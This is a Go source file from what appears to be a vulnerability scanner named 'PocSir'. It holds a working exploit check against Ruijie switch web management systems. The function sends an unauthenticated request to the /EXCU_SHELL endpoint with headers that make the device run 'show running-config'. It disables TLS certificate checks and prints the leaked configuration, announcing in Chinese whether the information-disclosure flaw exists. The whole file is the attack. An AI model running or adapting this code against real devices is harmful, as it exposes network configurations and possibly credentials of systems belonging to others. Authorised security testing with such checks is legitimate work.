package poc

import (
	"PocSir/config"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func Ruijie_Excu_Shell(target string) {
	pocUrl := target + "/EXCU_SHELL"

	headers := map[string]string{
		"User-Agent": getRandUa(),
		"Cmdnum":     "'1'",
		"Command1":   "show running-config",
		"Confirm1":   "n",
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	data := string(body)

	if resp.StatusCode == http.StatusOK && strings.Contains(data, "configuration") {
		config.Right.Printf("[+]存在锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞:%s\n", target)
		config.TextPut.Printf("[+]running-config:", data)
	} else {
		config.ErrMsg.Printf("[-]不存在锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞:%s\n", target)
	}
}
